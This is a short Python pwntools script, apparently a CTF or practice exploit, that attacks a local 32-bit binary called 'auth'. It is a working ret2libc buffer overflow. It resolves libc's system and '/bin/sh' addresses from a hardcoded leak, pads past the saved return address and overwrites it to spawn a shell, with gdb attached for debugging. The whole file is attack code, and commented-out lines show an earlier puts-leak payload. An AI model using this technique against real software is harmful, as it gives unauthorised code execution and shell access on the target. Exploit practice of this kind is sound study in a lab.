from pwn import *

elf = ELF("./auth")
context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']
# context.aslr = False

# libc = ELF("./libc.so.6")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

puts_addr = 0xf7c4c460 
puts_offset = libc.symbols["puts"]
libc.address = puts_addr - puts_offset


hash_address = 0x0804a038

check_password_addr = elf.symbols['check_password']
puts_addr = 0x80484b0
ret_gadget = 0x0804841a
malloc_failed_string = 0x08048776

system_libc = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))

print(hex(system_libc))
print(hex(binsh))



offset = 0x545 + 0x4



# payload = [
#     b"A" * offset,
#     pack(puts_addr),
#     pack(malloc_failed_string),
#     pack(ret_gadget)
#     # pack(puts_addr),
#     # pack(malloc_failed_string + 0x7),
#     # pack(ret_gadget),
#     # pack(system_libc),
#     # pack(ret_gadget),
#     # pack(binsh)

# ]
# payload = b"".join(payload)

payload = b""
payload += b"A" * offset
payload += pack(system_libc)
payload += 4 * b"B"
payload += pack(binsh)

print(payload)


io = elf.process()

gdb.attach(io, gdbscript='''start''')

io.sendline(payload)


io.interactive()

